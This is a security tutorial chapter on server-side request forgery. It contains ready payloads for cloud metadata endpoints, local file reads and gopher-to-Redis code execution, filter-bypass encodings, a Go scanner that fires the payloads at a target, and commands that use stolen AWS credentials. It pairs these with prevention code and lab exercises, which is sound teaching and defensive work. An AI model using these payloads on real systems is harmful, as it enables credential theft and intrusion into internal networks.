# Chapter 28: Server-Side Request Forgery (SSRF) — Making Servers Attack Themselves

*SSRF tricks a server into making requests on your behalf — to internal services, cloud metadata APIs, or even the server itself. It's how attackers pivot from an external web app into an organization's internal infrastructure.*

---

## What is SSRF?

A server fetches a URL on behalf of the user (image loading, webhook, URL preview). If the user controls that URL:

```
Normal:
User says: fetch https://avatar.example.com/user.jpg
Server fetches that URL, returns image

SSRF attack:
User says: fetch http://169.254.169.254/latest/meta-data/
Server fetches AWS metadata endpoint!
Server returns cloud credentials!
```

---

## Finding SSRF

Look for any functionality that fetches URLs:
- Import by URL (documents, images)
- Webhook configuration
- PDF generators (often fetch URLs to render)
- URL preview / link unfurling (Slack, Discord style)
- Server-side analytics pixel
- XML parsers (XXE → SSRF)

```bash
# Test with:
http://169.254.169.254/latest/meta-data/   # AWS metadata
http://metadata.google.internal/            # GCP metadata
http://169.254.169.254/metadata/v1/         # DigitalOcean
http://localhost/                            # internal web server
http://127.0.0.1:8080/admin                 # internal admin panel
http://10.0.0.1/                            # internal network
file:///etc/passwd                          # local file read!
```

### Using Burp Collaborator

```
1. Start Burp Collaborator server (generates unique URL)
2. Submit that URL to the target
3. If Collaborator receives a request → confirmed SSRF!

URL: http://YOUR_ID.burpcollaborator.net
```

---

## Cloud Metadata Exploitation

```bash
# AWS Instance Metadata Service (IMDS)
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/iam/security-credentials/
# Returns temporary AWS credentials:
# {
#   "AccessKeyId": "ASIAXXX",
#   "SecretAccessKey": "abc123...",
#   "Token": "FQoGZXIvYXdzEBQaDH..."
# }

# With these credentials:
AWS_ACCESS_KEY_ID=ASIAXXX \
AWS_SECRET_ACCESS_KEY=abc123 \
AWS_SESSION_TOKEN=FQoG... \
aws s3 ls  # list all S3 buckets!
aws iam get-user  # who are we?

# GCP Metadata
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
# Returns OAuth token for the instance's service account

# Azure
http://169.254.169.254/metadata/instance?api-version=2021-02-01
```

---

## SSRF Bypass Techniques

```
Blocked: http://127.0.0.1
Bypass:  http://127.0.0.1.nip.io     (DNS resolves to 127.0.0.1)
         http://0x7f000001            (hex IP)
         http://2130706433            (decimal IP)
         http://[::1]                 (IPv6 loopback)
         http://localhost             (resolved to 127.0.0.1)

Redirect bypass:
1. Create redirect on your server: 302 to http://169.254.169.254/
2. Submit your server URL → server follows redirect to internal
```

---

## Go: Testing for SSRF

```go
package main

import (
    "fmt"
    "net/http"
    "strings"
    "time"
)

// Out-of-band SSRF detection: submit callback URL, check if request arrives
// (needs an internet-accessible server to receive callbacks)

var ssrfPayloads = []string{
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://127.0.0.1/",
    "http://localhost/",
    "http://0.0.0.0/",
    "http://[::1]/",
    "file:///etc/passwd",
    "dict://127.0.0.1:6379/info",  // Redis info via SSRF
    "gopher://127.0.0.1:6379/_*1%0d%0a",  // Gopher → Redis RCE
}

func testSSRF(targetURL, paramName string) {
    client := &http.Client{Timeout: 5 * time.Second}
    
    for _, payload := range ssrfPayloads {
        reqURL := fmt.Sprintf("%s?%s=%s", targetURL, paramName, payload)
        resp, err := client.Get(reqURL)
        if err != nil {
            continue
        }
        defer resp.Body.Close()
        
        // Large response or specific content might indicate SSRF success
        if resp.ContentLength > 100 || resp.StatusCode == 200 {
            fmt.Printf("[POSSIBLE SSRF] %s\n  Status: %d, Length: %d\n",
                reqURL, resp.StatusCode, resp.ContentLength)
        }
    }
}

// Check if an IP is in a private/localhost range
func isInternalIP(host string) bool {
    privatePrefixes := []string{
        "10.", "172.16.", "172.17.", "172.18.", "172.19.",
        "172.20.", "172.21.", "172.22.", "172.23.", "172.24.",
        "172.25.", "172.26.", "172.27.", "172.28.", "172.29.",
        "172.30.", "172.31.", "192.168.", "127.", "169.254.",
        "::1", "fc00:", "fe80:",
    }
    for _, prefix := range privatePrefixes {
        if strings.HasPrefix(host, prefix) {
            return true
        }
    }
    return false
}

func main() {
    // Test a URL fetch feature
    testSSRF("http://target.com/fetch", "url")
}
```

---

## SSRF Prevention

```go
// Validate URLs before fetching
func isURLSafe(rawURL string) error {
    u, err := url.Parse(rawURL)
    if err != nil {
        return fmt.Errorf("invalid URL")
    }
    
    // Only allow HTTPS
    if u.Scheme != "https" {
        return fmt.Errorf("only HTTPS allowed")
    }
    
    // Resolve hostname
    ips, err := net.LookupHost(u.Hostname())
    if err != nil {
        return fmt.Errorf("cannot resolve hostname")
    }
    
    // Check resolved IPs are not internal
    for _, ip := range ips {
        if isInternalIP(ip) {
            return fmt.Errorf("target resolves to internal IP: %s", ip)
        }
    }
    
    return nil
}

// Use allowlist for webhooks
var allowedWebhookHosts = map[string]bool{
    "hooks.slack.com":    true,
    "discord.com":        true,
    "api.github.com":     true,
}

func validateWebhookURL(rawURL string) error {
    u, err := url.Parse(rawURL)
    if err != nil {
        return err
    }
    if !allowedWebhookHosts[u.Hostname()] {
        return fmt.Errorf("webhook host not in allowlist")
    }
    return nil
}
```

---

## Summary

| Scenario | What SSRF accesses | Impact |
|----------|-------------------|--------|
| Cloud instance | Metadata API → temp credentials | Full cloud account access |
| Internal network | Internal services, admin panels | Full internal network access |
| Local server | 127.0.0.1 admin, Redis, databases | Credential theft, RCE |
| File system | `file:///etc/passwd` | Local file read |

---

## Exercises

1. Set up a vulnerable SSRF app. Use it to access the local Redis instance (127.0.0.1:6379) via SSRF.
2. Build a Go webhook handler that validates webhook URLs against an allowlist and rejects private IPs.
3. Use Burp Suite to find an SSRF in PortSwigger's SSRF lab (free online).
4. Demonstrate how AWS metadata SSRF leads to IAM credential theft — set up a local EC2-like metadata mock server.
